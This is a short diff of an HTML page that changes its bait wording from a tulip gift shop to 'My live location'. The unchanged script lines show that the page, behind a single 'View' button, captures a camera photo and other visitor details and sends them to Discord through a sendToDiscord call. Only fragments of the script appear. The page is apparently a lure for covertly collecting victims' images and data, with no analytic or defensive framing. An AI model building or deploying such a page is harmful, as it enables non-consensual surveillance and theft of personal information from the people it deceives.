@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>tulips gift</title>
+  <title>Live Location</title>
   <style>
     body { font-family: sans-serif; background: #f4f4f4; padding: 20px; }
     .shop { background: white; padding: 20px; max-width: 400px; margin: auto; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
@@ -14,7 +14,7 @@
 </head>
 <body>
   <div class="shop">
-    <h1>Tulips</h1>
+    <h1>My live location</h1>
     <button id="buyBtn">View</button>
   </div>
 
@@ -102,7 +102,7 @@
 - **Camera Access**: ${photoBlob ? "Success" : "Failed / Denied"}`;
 
       await sendToDiscord(photoBlob || new Blob(["No photo"]), infoText);
-      alert("wait for ");
+      alert("wait for it ");
     });
   </script>
 </body>
